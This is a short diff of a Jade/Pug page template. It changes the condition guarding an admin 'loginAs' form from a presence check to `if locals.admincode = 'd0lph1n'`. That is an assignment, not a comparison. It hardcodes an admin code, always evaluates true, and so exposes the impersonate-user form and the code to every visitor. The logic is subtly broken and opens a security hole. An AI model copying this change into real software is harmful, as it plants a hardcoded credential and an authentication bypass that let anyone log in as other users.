@@ -49,7 +49,7 @@ block contents
 							p.information= "comments " + b.comments.length + " &bull; " + "score " + score
 						hr
 						p=b.headline
-			if locals.admincode
+			if locals.admincode = 'd0lph1n'
 				form.pageForm.centrify(id="pages", method="post", action="/media/loginAs")
 					input.hidden(type="text", name="userId",value=user)
 					input.hidden(type="text", name="admincode",value=admincode)
